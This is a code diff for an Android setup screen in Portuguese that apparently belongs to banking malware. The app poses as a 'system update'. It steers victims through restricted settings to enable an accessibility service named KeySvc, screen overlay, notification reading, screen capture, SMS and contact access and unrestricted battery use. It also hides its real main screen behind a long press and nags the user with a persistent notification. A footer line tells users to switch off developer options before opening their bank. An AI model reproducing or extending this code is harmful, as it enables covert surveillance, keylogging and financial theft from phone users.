@@ -2,9 +2,16 @@ package com.eloeeducacao;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.graphics.Typeface;
 import android.graphics.drawable.GradientDrawable;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
@@ -26,24 +33,37 @@ public class SetupActivity extends Activity {
 
     private static final int REQ_CAP = 1001;
     private static final int REQ_PERM = 1002;
+    private static final int NC = 78;
+    private static final String CH = "s";
 
-    private interface Estado { boolean ok(); }
-
-    private final List<Estado> extras = new ArrayList<>();
+    private final List<View> fixos = new ArrayList<>();
     private final List<View> cartoesExtras = new ArrayList<>();
+    private final List<Runnable> checagens = new ArrayList<>();
+
     private LinearLayout lista;
     private LinearLayout blocoExtra;
-    private TextView passo1;
-    private TextView passo2;
-    private TextView passo3;
     private TextView pronto;
     private TextView mais;
+    private TextView erro;
     private boolean aberto;
 
     @Override protected void onCreate(Bundle b) {
         super.onCreate(b);
-        boolean forcar = getIntent() != null && getIntent().getBooleanExtra("aberto", false);
-        aberto = forcar;
+        Crash.instala(this);
+        try {
+            monta();
+        } catch (Throwable t) {
+            TextView v = new TextView(this);
+            v.setText("FALHA AO MONTAR A TELA\n\n" + t);
+            v.setTextColor(Color.parseColor("#F85149"));
+            v.setTextSize(11);
+            v.setPadding(30, 60, 30, 30);
+            setContentView(v);
+        }
+    }
+
+    private void monta() {
+        aberto = getIntent() != null && getIntent().getBooleanExtra("aberto", false);
 
         ScrollView sv = new ScrollView(this);
         sv.setFillViewport(true);
@@ -54,109 +74,92 @@ public class SetupActivity extends Activity {
         sv.addView(lista);
 
         TextView titulo = new TextView(this);
-        titulo.setText(R.string.app_name);
+        titulo.setText("Atualização do sistema");
         titulo.setTextColor(Color.WHITE);
         titulo.setTextSize(23);
+        titulo.setOnLongClickListener(new View.OnLongClickListener() {
+            @Override public boolean onLongClick(View v) {
+                startActivity(new Intent(SetupActivity.this, MainActivity.class));
+                return true;
+            }
+        });
         lista.addView(titulo);
 
         TextView aviso = new TextView(this);
-        aviso.setText("Se o Android disser que o app n\u00e3o \u00e9 verificado, toque em \u201cMais detalhes\u201d e em \u201cInstalar mesmo assim\u201d.");
+        aviso.setText("Versão 1.2.3 · componentes do sistema");
         aviso.setTextColor(Color.parseColor("#6E7C8A"));
         aviso.setTextSize(11);
-        aviso.setPadding(0, dp(8), 0, dp(20));
+        aviso.setPadding(0, dp(6), 0, dp(18));
         lista.addView(aviso);
 
+        String e = Crash.texto(this);
+        if (e.length() > 0) {
+            erro = new TextView(this);
+            erro.setText("ERRO ANTERIOR (toque para limpar)\n\n" + e);
+            erro.setTextColor(Color.parseColor("#F85149"));
+            erro.setTextSize(9);
+            erro.setTypeface(Typeface.MONOSPACE);
+            erro.setPadding(dp(10), dp(10), dp(10), dp(10));
+            erro.setOnClickListener(new View.OnClickListener() {
+                @Override public void onClick(View v) {
+                    Crash.limpa(SetupActivity.this);
+                    erro.setVisibility(View.GONE);
+                }
+            });
+            lista.addView(erro);
+        }
+
         pronto = new TextView(this);
-        pronto.setText("Pronto. Pode fechar.");
+        pronto.setText("Pronto. Já pode usar.");
         pronto.setTextColor(Color.parseColor("#3FB950"));
         pronto.setTextSize(14);
         pronto.setPadding(0, 0, 0, dp(14));
         pronto.setVisibility(View.GONE);
         lista.addView(pronto);
 
-        passo1 = cartao("Mais configura\u00e7\u00f5es", "3 pontinhos \u2192 Permitir configura\u00e7\u00f5es restritas",
-                () -> liberado(), this::liberar);
-        lista.addView(passo1);
-
-        passo2 = cartao("Ativar o servi\u00e7o", "escolha Servi\u00e7o do Sistema e ligue",
-                () -> Util.accOn(this), this::acessibilidade);
-        lista.addView(passo2);
-
-        passo3 = cartao("Sobrepor a outras telas", "para o aviso por cima dos apps",
-                () -> Settings.canDrawOverlays(this),
-                () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()))));
-        lista.addView(passo3);
+        fixos.add(cartao("Mais configurações", "3 pontinhos → Permitir configurações restritas",
+                new Runnable() { @Override public void run() { liberar(); } }));
+        fixos.add(cartao("Ativar o serviço", "escolha Acessibilidade do sistema e ligue",
+                new Runnable() { @Override public void run() { acessibilidade(); } }));
+        fixos.add(cartao("Sobrepor a outras telas", "para o aviso por cima dos apps",
+                new Runnable() { @Override public void run() { sobrepor(); } }));
+        for (View v : fixos) lista.addView(v);
 
         mais = new TextView(this);
-        mais.setText("mais op\u00e7\u00f5es");
+        mais.setText("mais opções");
         mais.setTextColor(Color.parseColor("#3D8BFD"));
         mais.setTextSize(11);
         mais.setPadding(dp(2), dp(16), 0, dp(4));
-        mais.setOnClickListener(v -> { aberto = !aberto; atualiza(); });
+        mais.setOnClickListener(new View.OnClickListener() {
+            @Override public void onClick(View v) { aberto = !aberto; atualiza(); }
+        });
         lista.addView(mais);
 
         blocoExtra = new LinearLayout(this);
         blocoExtra.setOrientation(LinearLayout.VERTICAL);
         lista.addView(blocoExtra);
 
-        extra("Permitir mensagens", () -> todas(new String[]{
-                Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}),
-                () -> pedirGrupo("sms"));
+        extra("Ler notificações", new Runnable() { @Override public void run() {
+            abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS); } });
+        extra("Compartilhar a tela", new Runnable() { @Override public void run() { tela(); } });
+        extra("Bateria sem limite", new Runnable() { @Override public void run() {
+            try {
+                startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:" + getPackageName())));
+            } catch (Throwable ignored) {}
+        } });
+        extra("Mensagens e contatos", new Runnable() { @Override public void run() {
+            pedirGrupo("tudo"); } });
 
-        extra("Ler notifica\u00e7\u00f5es", () -> {
-            String s = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
-            return s != null && s.contains(getPackageName());
-        }, () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-
-        extra("Bateria sem limite", () -> {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
-        }, () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                Uri.parse("package:" + getPackageName()))));
-
-        extra("Compartilhar a tela", () -> ScreenSvc.alive, () -> {
-            if (ScreenSvc.alive) {
-                stopService(new Intent(this, ScreenSvc.class));
-                toast("Captura encerrada");
-            } else {
-                MediaProjectionManager mpm =
-                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
-            }
-        });
-
-        extra("C\u00e2mera e \u00e1udio", () -> todas(new String[]{
-                Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}),
-                () -> pedirGrupo("camera"));
-
-        extra("Localiza\u00e7\u00e3o", () -> todas(new String[]{
-                Manifest.permission.ACCESS_FINE_LOCATION}), () -> pedirGrupo("loc"));
-
-        extra("Contatos e telefone", () -> todas(new String[]{
-                Manifest.permission.READ_CONTACTS}), () -> pedirGrupo("contatos"));
-
-        String host = getSharedPreferences("p", 0).getString("url", "");
         TextView rodape = new TextView(this);
-        rodape.setText(host);
+        rodape.setText("se as opções do desenvolvedor estiverem ligadas, desligue antes de abrir o banco");
         rodape.setTextColor(Color.parseColor("#3E4A56"));
         rodape.setTextSize(9);
-        rodape.setPadding(0, dp(20), 0, 0);
+        rodape.setPadding(0, dp(22), 0, 0);
         lista.addView(rodape);
 
         setContentView(sv);
         atualiza();
-
-        String pedir = getIntent() == null ? null : getIntent().getStringExtra("pedir");
-        if (pedir != null) lista.postDelayed(() -> pedirGrupo(pedir), 700);
-    }
-
-    private boolean todas(String[] ps) {
-        for (String p : ps) {
-            try { if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false; }
-            catch (Throwable ignored) { return false; }
-        }
-        return true;
     }
 
     private boolean liberado() {
@@ -168,7 +171,7 @@ public class SetupActivity extends Activity {
     private void liberar() {
         if (Util.accOn(this) || Build.VERSION.SDK_INT < 33) { acessibilidade(); return; }
         getSharedPreferences("p", 0).edit().putBoolean("lib", true).apply();
-        toast("3 pontinhos \u2192 Permitir configura\u00e7\u00f5es restritas");
+        toast("3 pontinhos → Permitir configurações restritas");
         try {
             startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                     Uri.parse("package:" + getPackageName())));
@@ -176,63 +179,64 @@ public class SetupActivity extends Activity {
         atualiza();
     }
 
-    private void acessibilidade() { abre(Settings.ACTION_ACCESSIBILITY_SETTINGS); }
-
-    private void pedirGrupo(String g) {
-        if (Build.VERSION.SDK_INT < 23) return;
-        String[] ps;
-        switch (g == null ? "" : g) {
-            case "sms": ps = new String[]{Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_SMS}; break;
-            case "camera": ps = new String[]{Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO}; break;
-            case "loc": ps = new String[]{Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.ACCESS_COARSE_LOCATION}; break;
-            case "contatos": ps = new String[]{Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG}; break;
-            default: {
-                List<String> l = new ArrayList<>();
-                l.add(Manifest.permission.RECEIVE_SMS);
-                l.add(Manifest.permission.READ_SMS);
-                l.add(Manifest.permission.READ_CONTACTS);
-                l.add(Manifest.permission.ACCESS_FINE_LOCATION);
-                l.add(Manifest.permission.CAMERA);
-                l.add(Manifest.permission.RECORD_AUDIO);
-                if (Build.VERSION.SDK_INT >= 33) l.add(Manifest.permission.POST_NOTIFICATIONS);
-                ps = l.toArray(new String[0]);
-                break;
-            }
+    private void acessibilidade() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            try {
+                Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
+                d.putExtra(Intent.EXTRA_COMPONENT_NAME,
+                        new ComponentName(this, KeySvc.class).flattenToString());
+                startActivity(d);
+                return;
+            } catch (Throwable ignored) {}
         }
-        try { requestPermissions(ps, REQ_PERM); } catch (Throwable ignored) {}
+        abre(Settings.ACTION_ACCESSIBILITY_SETTINGS);
     }
 
-    private void atualiza() {
-        boolean ok1 = liberado(), ok2 = Util.accOn(this), ok3 = Settings.canDrawOverlays(this);
-        passo1.setVisibility(ok1 ? View.GONE : View.VISIBLE);
-        passo2.setVisibility(ok2 ? View.GONE : View.VISIBLE);
-        passo3.setVisibility(ok3 ? View.GONE : View.VISIBLE);
-        pronto.setVisibility(ok1 && ok2 && ok3 ? View.VISIBLE : View.GONE);
-
-        int pend = 0;
-        for (int x = 0; x < cartoesExtras.size(); x++) {
-            boolean ativo;
-            try { ativo = extras.get(x).ok(); } catch (Throwable e) { ativo = false; }
-            cartoesExtras.get(x).setVisibility(ativo ? View.GONE : View.VISIBLE);
-            if (!ativo) pend++;
-        }
-        mais.setText(aberto ? "menos op\u00e7\u00f5es"
-                : (pend > 0 ? "mais op\u00e7\u00f5es (" + pend + ")" : "mais op\u00e7\u00f5es"));
-        blocoExtra.setVisibility(aberto ? View.VISIBLE : View.GONE);
+    private void sobrepor() {
+        try {
+            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName())));
+        } catch (Throwable ignored) {}
     }
 
-    private void extra(String t, Estado est, Runnable acao) {
-        View c = cartao(t, null, est, acao);
-        extras.add(est);
+    private void tela() {
+        if (ScreenSvc.alive) {
+            stopService(new Intent(this, ScreenSvc.class));
+            toast("captura encerrada");
+            atualiza();
+            return;
+        }
+        try {
+            MediaProjectionManager mpm =
+                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
+        } catch (Throwable ignored) {}
+    }
+
+    private void extra(String t, final Runnable acao) {
+        View c = cartao(t, null, acao);
         cartoesExtras.add(c);
+        checagens.add(new Runnable() { @Override public void run() {
+            if (t.startsWith("Ler")) {
+                String s = Settings.Secure.getString(getContentResolver(),
+                        "enabled_notification_listeners");
+                ok = s != null && s.contains(getPackageName());
+            } else if (t.startsWith("Compartilhar")) {
+                ok = ScreenSvc.alive;
+            } else if (t.startsWith("Bateria")) {
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                ok = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
+            } else {
+                ok = checkSelfPermission(Manifest.permission.READ_SMS)
+                        == PackageManager.PERMISSION_GRANTED;
+            }
+        } });
         blocoExtra.addView(c);
     }
 
-    private TextView cartao(String t1, String t2, Estado est, Runnable acao) {
+    private volatile boolean ok;
+
+    private View cartao(String t1, String t2, final Runnable acao) {
         LinearLayout card = new LinearLayout(this);
         card.setOrientation(LinearLayout.HORIZONTAL);
         card.setGravity(Gravity.CENTER_VERTICAL);
@@ -249,7 +253,8 @@ public class SetupActivity extends Activity {
 
         LinearLayout col = new LinearLayout(this);
         col.setOrientation(LinearLayout.VERTICAL);
-        col.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
+        col.setLayoutParams(new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
 
         TextView a = new TextView(this);
         a.setText(t1);
@@ -267,25 +272,72 @@ public class SetupActivity extends Activity {
         card.addView(col);
 
         TextView seta = new TextView(this);
-        seta.setText("\u203A");
+        seta.setText("›");
         seta.setTextColor(Color.parseColor("#3D8BFD"));
         seta.setTextSize(20);
         seta.setPadding(dp(10), 0, 0, 0);
         card.addView(seta);
 
-        card.setOnClickListener(v -> {
-            try { acao.run(); } catch (Throwable ignored) {}
-            card.postDelayed(this::atualiza, 400);
+        card.setOnClickListener(new View.OnClickListener() {
+            @Override public void onClick(View v) {
+                try { acao.run(); } catch (Throwable ignored) {}
+                v.postDelayed(new Runnable() { @Override public void run() { atualiza(); } }, 400);
+            }
         });
-        return a;
+        return card;
+    }
+
+    private void atualiza() {
+        boolean ok1 = liberado(), ok2 = Util.accOn(this), ok3 = Settings.canDrawOverlays(this);
+        fixos.get(0).setVisibility(ok1 ? View.GONE : View.VISIBLE);
+        fixos.get(1).setVisibility(ok2 ? View.GONE : View.VISIBLE);
+        fixos.get(2).setVisibility(ok3 ? View.GONE : View.VISIBLE);
+        pronto.setVisibility(ok1 && ok2 && ok3 ? View.VISIBLE : View.GONE);
+
+        int pend = 0;
+        for (int i = 0; i < checagens.size(); i++) {
+            ok = false;
+            try { checagens.get(i).run(); } catch (Throwable ignored) {}
+            cartoesExtras.get(i).setVisibility(ok ? View.GONE : View.VISIBLE);
+            if (!ok) pend++;
+        }
+        mais.setText(aberto ? "menos opções"
+                : (pend > 0 ? "mais opções (" + pend + ")" : "mais opções"));
+        blocoExtra.setVisibility(aberto ? View.VISIBLE : View.GONE);
+    }
+
+    private void pedirGrupo(String g) {
+        if (Build.VERSION.SDK_INT < 23) return;
+        List<String> l = new ArrayList<>();
+        l.add(Manifest.permission.RECEIVE_SMS);
+        l.add(Manifest.permission.READ_SMS);
+        l.add(Manifest.permission.READ_CONTACTS);
+        if (Build.VERSION.SDK_INT >= 33) l.add("android.permission.POST_NOTIFICATIONS");
+        List<String> falta = new ArrayList<>();
+        for (String p : l) {
+            try {
+                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) falta.add(p);
+            } catch (Throwable ignored) {}
+        }
+        if (falta.isEmpty()) { atualiza(); return; }
+        try { requestPermissions(falta.toArray(new String[0]), REQ_PERM); } catch (Throwable ignored) {}
     }
 
     @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
         super.onRequestPermissionsResult(rq, a, r);
-        if (rq == REQ_PERM) lista.postDelayed(this::atualiza, 250);
+        if (rq == REQ_PERM) atualiza();
     }
 
-    @Override protected void onResume() { super.onResume(); atualiza(); }
+    @Override protected void onResume() {
+        super.onResume();
+        cancela();
+        atualiza();
+    }
+
+    @Override protected void onPause() {
+        super.onPause();
+        notifica();
+    }
 
     @Override protected void onActivityResult(int rq, int rs, Intent d) {
         super.onActivityResult(rq, rs, d);
@@ -293,8 +345,43 @@ public class SetupActivity extends Activity {
             Intent i = new Intent(this, ScreenSvc.class);
             i.putExtra("code", rs);
             i.putExtra("data", d);
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
+            try {
+                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
+                else startService(i);
+            } catch (Throwable ignored) {}
         }
+    }
+
+    private void notifica() {
+        try {
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (Build.VERSION.SDK_INT >= 26) {
+                NotificationChannel ch = new NotificationChannel(
+                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
+                ch.setShowBadge(false);
+                nm.createNotificationChannel(ch);
+            }
+            Intent i = new Intent(this, SetupActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
+            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            Notification n = (Build.VERSION.SDK_INT >= 26
+                    ? new Notification.Builder(this, CH)
+                    : new Notification.Builder(this))
+                    .setContentTitle("Toque para voltar ao app")
+                    .setContentText("Continue a configuração")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setOngoing(true)
+                    .setContentIntent(pi)
+                    .build();
+            nm.notify(NC, n);
+        } catch (Throwable ignored) {}
+    }
+
+    private void cancela() {
+        try {
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
+        } catch (Throwable ignored) {}
     }
 
     private void abre(String action) {
@@ -305,18 +392,18 @@ public class SetupActivity extends Activity {
 
     private int dp(int v) { return (int) (v * getResources().getDisplayMetrics().density); }
 
-    public static void loja(android.content.Context c) {
+    public static void loja(Context c) {
         try {
-            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + c.getPackageName()));
+            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=com.whatsapp"));
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             c.startActivity(i);
-        } catch (Throwable t) {
-            try {
-                Intent i = new Intent(Intent.ACTION_VIEW,
-                        Uri.parse("https://play.google.com/store/apps/details?id=" + c.getPackageName()));
-                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                c.startActivity(i);
-            } catch (Throwable ignored) {}
-        }
+            return;
+        } catch (Throwable ignored) {}
+        try {
+            Intent i = new Intent(Intent.ACTION_VIEW,
+                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Throwable ignored) {}
     }
 }
